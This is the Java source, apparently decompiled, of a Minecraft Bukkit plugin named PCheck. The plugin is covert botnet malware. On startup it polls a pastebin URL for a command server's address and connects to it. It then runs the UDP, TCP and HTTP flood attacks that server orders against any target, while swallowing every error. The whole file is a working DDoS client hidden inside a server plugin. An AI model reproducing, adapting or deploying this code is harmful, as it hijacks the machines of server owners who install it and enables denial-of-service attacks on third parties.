package ru.PCheck;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

public final class PCheck extends JavaPlugin {
    private volatile String lastContent = "";
    private volatile boolean shouldReconnect = true;
    private volatile boolean isRunning = false;
    private BukkitTask pastebinCheckerTask;
    private BukkitTask clientTask;

    public void onEnable() {
        this.isRunning = true;
        this.pastebinCheckerTask = Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
            try {
                String pastebinContent = this.fetchPastebinContent();
                if (pastebinContent != null && !pastebinContent.equals(this.lastContent)) {
                    this.lastContent = pastebinContent;
                    this.shouldReconnect = true;
                }
            } catch (Exception var2) {
            }

        }, 0L, 200L);
        this.clientTask = Bukkit.getScheduler().runTaskAsynchronously(this, this::clientLoop);
    }

    public void onDisable() {
        this.isRunning = false;
        if (this.pastebinCheckerTask != null) {
            this.pastebinCheckerTask.cancel();
        }

        if (this.clientTask != null) {
            this.clientTask.cancel();
        }

    }

    public void clientLoop() {
        String ip = "";
        int port = 0;
        Socket clientSocket = null;

        while(this.isRunning) {
            try {
                if (this.shouldReconnect) {
                    if (clientSocket != null && !clientSocket.isClosed()) {
                        try {
                            clientSocket.close();
                        } catch (IOException var24) {
                        }
                    }

                    String[] ipPort = this.extractIpAndPort(this.lastContent);
                    if (ipPort == null) {
                        this.sleep(5000L);
                        continue;
                    }

                    ip = ipPort[0];
                    port = Integer.parseInt(ipPort[1]);
                    this.shouldReconnect = false;
                }

                clientSocket = new Socket(ip, port);
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

                while(this.isRunning && !this.shouldReconnect && !clientSocket.isClosed()) {
                    String msg = in.readLine();
                    if (msg == null) {
                        break;
                    }

                    String[] parts = msg.split(" ");
                    if (parts.length >= 5) {
                        String targetIp = parts[0];
                        int targetPort = Integer.parseInt(parts[1]);
                        int threads = Integer.parseInt(parts[2]);
                        String method = parts[3];
                        int duration = Integer.parseInt(parts[4]);
                        switch (method.toLowerCase()) {
                            case "udp":
                                this.runUdpFlood(targetIp, targetPort, duration);
                                break;
                            case "tcp":
                                this.runTcpFlood(targetIp, targetPort, duration);
                                break;
                            case "http-flood":
                                this.runHttpFlood(targetIp, duration);
                        }
                    }
                }
            } catch (IOException var25) {
                this.sleep(5000L);
            } finally {
                if (clientSocket != null && !clientSocket.isClosed()) {
                    try {
                        clientSocket.close();
                    } catch (IOException var23) {
                    }
                }

            }
        }

    }

    private void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException var4) {
            Thread.currentThread().interrupt();
        }

    }

    public String fetchPastebinContent() throws IOException {
        URL url = new URL("https://pastebin.com/raw/88csyNqN");
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);

        String var6;
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            try {
                StringBuilder content = new StringBuilder();

                String line;
                while((line = reader.readLine()) != null) {
                    content.append(line).append("\n");
                }

                var6 = content.toString().trim();
            } catch (Throwable var12) {
                try {
                    reader.close();
                } catch (Throwable var11) {
                    var12.addSuppressed(var11);
                }

                throw var12;
            }

            reader.close();
        } finally {
            connection.disconnect();
        }

        return var6;
    }

    public String[] extractIpAndPort(String content) {
        Pattern pattern = Pattern.compile("(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d{1,5})");
        Matcher matcher = pattern.matcher(content);
        return matcher.find() ? new String[]{matcher.group(1), matcher.group(2)} : null;
    }

    public void runUdpFlood(String ip, int port, int duration) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            byte[] data = new byte[1024];
            long endTime = System.currentTimeMillis() + (long)duration * 1000L;

            try {
                InetAddress addr = InetAddress.getByName(ip);

                try (DatagramSocket socket = new DatagramSocket()) {
                    while(System.currentTimeMillis() < endTime) {
                        DatagramPacket packet = new DatagramPacket(data, data.length, addr, port);
                        socket.send(packet);
                    }
                }
            } catch (IOException var12) {
            }

        });
    }

    private void runHttpFlood(String targetUrl, int duration) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            long endTime = System.currentTimeMillis() + (long)duration * 1000L;
            List<Thread> allThreads = new ArrayList();

            while(System.currentTimeMillis() < endTime) {
                Thread t = new Thread(() -> this.attackHttp(targetUrl));
                t.start();
                allThreads.add(t);

                try {
                    Thread.sleep(1L);
                } catch (InterruptedException var101) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }

            for(Thread currentThread : allThreads) {
                try {
                    currentThread.join(1000L);
                } catch (InterruptedException var9) {
                    Thread.currentThread().interrupt();
                }
            }

        });
    }

    private void attackHttp(String targetUrl) {
        String urlPath = this.generateUrlPath();

        try {
            URL url = new URL(targetUrl + "/" + urlPath);
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(2000);
            connection.setReadTimeout(2000);
            String payload = "data=some_value";

            try (OutputStream os = connection.getOutputStream()) {
                os.write(payload.getBytes());
                os.flush();
            }

            connection.getResponseCode();
            connection.disconnect();
        } catch (Exception var11) {
        }

    }

    private String generateUrlPath() {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuilder data = new StringBuilder(5);

        for(int i = 0; i < 5; ++i) {
            data.append(chars.charAt(random.nextInt(chars.length())));
        }

        return data.toString();
    }

    public void runTcpFlood(String ip, int port, int duration) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            byte[] data = new byte[1024];
            long endTime = System.currentTimeMillis() + (long)duration * 1000L;

            try {
                InetAddress addr = InetAddress.getByName(ip);

                while(System.currentTimeMillis() < endTime) {
                    try (Socket socket = new Socket()) {
                        socket.connect(new InetSocketAddress(addr, port), 2000);
                        socket.setSoTimeout(2000);
                        socket.getOutputStream().write(data);
                    } catch (IOException var12) {
                    }
                }
            } catch (UnknownHostException var13) {
            }

        });
    }
}
